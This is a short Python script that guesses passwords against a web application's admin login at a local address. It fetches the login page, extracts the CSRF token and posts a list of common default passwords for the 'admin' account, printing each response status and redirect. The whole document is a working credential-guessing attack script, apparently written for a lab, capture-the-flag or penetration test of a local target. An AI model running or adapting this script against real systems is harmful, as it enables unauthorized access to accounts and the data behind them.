#!/usr/bin/env python3
import re, requests
BASE='http://127.0.0.1:8080'
def csrf(h):
    m=re.search(r'name="csrf_token"\s+value="([^"]+)"',h) or re.search(r'meta name="csrf-token" content="([^"]+)"',h)
    return m.group(1) if m else None
for pwd in ['admin','Admin@123','Admin123','123456','admin123','Admin@1234','admin']:
    s=requests.Session()
    r=s.get(BASE+'/login'); tok=csrf(r.text)
    rr=s.post(BASE+'/login',data={'username':'admin','password':pwd,'csrf_token':tok,'login_mode':'admin'},allow_redirects=False,timeout=20)
    print(f'{pwd!r}: {rr.status_code} {rr.headers.get("Location","")}')